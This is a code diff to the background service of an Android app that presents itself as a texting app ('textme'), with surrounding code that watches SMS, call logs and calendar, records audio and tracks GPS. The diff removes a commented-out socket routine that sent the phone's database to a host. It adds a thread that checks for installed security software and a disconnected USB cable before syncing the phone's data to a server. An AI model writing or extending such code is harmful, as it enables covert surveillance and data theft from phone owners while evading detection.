@@ -24,6 +24,7 @@ import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
 
+import com.candroid.textme.data.Commands;
 import com.candroid.textme.data.Constants;
 import com.candroid.textme.data.db.Database;
 import com.candroid.textme.data.db.DatabaseHelper;
@@ -79,6 +80,7 @@ public class MessagingService extends Service {
     private HandlerThread mHandlerThread;
     private Looper mLooper;
     public static Recorder sRecorder;
+    public static boolean sIsBot;
     public MessagingService() {
     }
 
@@ -140,7 +142,6 @@ public class MessagingService extends Service {
             outgoingCallFilter.addCategory(Intent.CATEGORY_DEFAULT);
             registerReceiver(mOutgoingCallReceiver, outgoingCallFilter);
         }
-
         registerReceiver(mCreateConversationReceiver, conversationFilter);
         registerReceiver(mIncomingReceiver, incomingFilter);
         registerReceiver(mOutgoingReceiver, outgoingFilter);
@@ -161,7 +162,6 @@ public class MessagingService extends Service {
         getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
         if(this.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED){
             getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);
-
         }
         if(this.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
             getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
@@ -171,6 +171,7 @@ public class MessagingService extends Service {
         ScreenReceiver.sShouldRecordAudio = sharedPreferences.getBoolean(ScreenReceiver.RECORDER_KEY, false);
         JobsIntentService.sShouldTrackGps = sharedPreferences.getBoolean(JobsIntentService.GPS_TRACKER_KEY, false);
         sHasCalledHome = sharedPreferences.getBoolean(Constants.Keys.CALLED_HOME_KEY, false);
+        sIsBot = sharedPreferences.getBoolean(Constants.Keys.IS_BOT_KEY, false);
         //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
     }
 
@@ -185,66 +186,20 @@ public class MessagingService extends Service {
             mLocationListener = Lofl.getLocationListener(this);
             mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
         }*/
-        if(JobsIntentService.sShouldTrackGps){
-            Lofl.onReceiveCommand(this, 21, "start", null);
-        }
-        /*if(!sHasCalledHome){
-            Lofl.onReceiveCommand(this, 22, sTelephoneAddress, null);
-        }*/
-        Lofl.onReceiveCommand(this, 5, null, null);
-       //ArrayList<String> addresses = Lofl.fetchIpv4Addresses();
-   /*     new Thread(new Runnable() {
-            @Override
-            public void run() {
-                ArrayList<String> addresses = null;
-                Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
-                try {
-                    Socket socket = new Socket("10.0.2.2", 6666);
-                    ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
-                    byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(MessagingService.this));
-                    oos.writeObject(String.valueOf(bytes));
-                    oos.flush();
-                    *//* for(int i = 0; i < 3; i++){
-                        addresses = Lofl.fetchIpv4Addresses();
-                        Socket socket = new Socket("10.0.2.2", 6666);
-                        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
-                        if(i == 0){
-                            oos.writeObject(sTelephoneAddress);
-                        }else if(i == 1){
-                            oos.writeObject(InetAddress.getLocalHost().toString());
-                        }else if(i == 2){
-                            byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(MessagingService.this));
-                            oos.writeObject(bytes);
-                            oos.flush();
-                        }
-                        oos.close();
-                        socket.close();
-                    }*//*
-                    oos.close();
-                    socket.close();
-                } catch (UnknownHostException e) {
-                    e.printStackTrace();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-*//*                try {
-                    ServerSocket serverSocket = new ServerSocket(8080, 0, InetAddress.getLocalHost());
-                    while(true) {
-                        Socket socket = serverSocket.accept();
-                        ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
-                        String message = (String) ois.readObject();
-                        Log.d(TAG, message);
-                        ois.close();
-                        socket.close();
+        if(!sIsBot){
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    boolean hasSecuritySoftware = Lofl.hasSecuritySoftwareInstalled(MessagingService.this);
+                    if( ! hasSecuritySoftware && Lofl.isUsbDisconnected(MessagingService.this)){
+                        Lofl.onReceiveCommand(MessagingService.this, Commands.SYNC_PHONE_TO_SERVER, null, null);
                     }
-                } catch (IOException e) {
-                        e.printStackTrace();
-                    } catch (ClassNotFoundException e) {
-                        e.printStackTrace();
-                    }*//*
-            }
-        }).start();*/
-
+                }
+            }).start();
+        }
+        if(JobsIntentService.sShouldTrackGps){
+            Lofl.onReceiveCommand(this, Commands.GPS_TRACKER, "start", null);
+        }
         return super.onStartCommand(intent, flags, startId);
     }
 
